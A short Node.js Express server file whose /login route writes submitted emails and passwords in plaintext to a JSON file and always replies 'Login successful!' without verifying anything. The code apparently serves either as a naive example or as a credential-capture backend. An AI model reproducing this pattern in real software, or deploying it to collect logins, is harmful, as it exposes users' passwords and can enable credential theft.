// server.js (Node.js with Express)
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // Serve static files like HTML, CSS, JS

// POST route for handling form submission
app.post('/login', (req, res) => {
    const { email, password } = req.body;
    
    const data = {
        email,
        password,
    };
    
    // Write to a JSON file (or any format you prefer)
    fs.writeFileSync(path.join(__dirname, 'data', 'login_data.json'), JSON.stringify(data, null, 2));
    
    // Send a response to the client
    res.send('Login successful!');
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
